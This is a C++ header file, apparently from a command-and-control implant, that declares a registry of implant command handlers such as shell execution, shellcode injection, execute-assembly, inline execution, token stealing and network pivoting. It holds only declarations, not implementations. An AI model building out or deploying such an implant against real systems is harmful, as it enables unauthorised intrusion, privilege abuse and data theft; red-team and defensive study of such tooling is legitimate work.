#pragma once
#define _CRT_SECURE_NO_WARNINGS

#include "Ntdll.h"
#include <nlohmann/json.hpp>
#include <string>
#include <vector>

using json   = nlohmann::json;
using string = std::string;

#define FLAG_TASK_ARTIFACT 0x00000001
#define FLAG_TASK_OUTPUT 0x00000002

// ImplantCommand implant command handler
//
// g_ImplantCommandRegistry implant command handlers
//
typedef struct {
    string Name;
    BOOL ( *Invoke )( json&, string, json& );
} ImplantCommand;

extern std::vector<ImplantCommand> g_CommandRegistry;

BOOL CommandChannelRegister( json& args, string artifact, json& result );
BOOL CommandChannelSwitch( json& args, string artifact, json& result );
BOOL CommandChannelList( json& args, string artifact, json& result );
BOOL CommandChannelRemove( json& args, string artifact, json& result );
BOOL CommandExit( json& args, string artifact, json& result );
BOOL CommandPs( json& args, string artifact, json& result );
BOOL CommandCd( json& args, string artifact, json& result );
BOOL CommandCp( json& args, string artifact, json& result );
BOOL CommandShell( json& args, string artifact, json& result );
BOOL CommandDownload( json& args, string artifact, json& result );
BOOL CommandUpload( json& args, string artifact, json& result );
BOOL CommandRun( json& args, string artifact, json& result );
BOOL CommandExecuteAssembly( json& args, string artifact, json& result );
BOOL CommandJobList( json& args, string artifact, json& result );
BOOL CommandJobStop( json& args, string artifact, json& result );
BOOL CommandInlineExecute( json& args, string artifact, json& result );
BOOL CommandInjectShellcode( json& args, string artifact, json& result );
BOOL CommandTokenInfo( json& args, string artifact, json& result );
BOOL CommandTokenRev2Self( json& args, string artifact, json& result );
BOOL CommandTokenMake( json& args, string artifact, json& result );
BOOL CommandTokenSteal( json& args, string artifact, json& result );
BOOL CommandPivotConnect( json& args, string artifact, json& result );
BOOL CommandPivotRequest( json& args, string artifact, json& result );
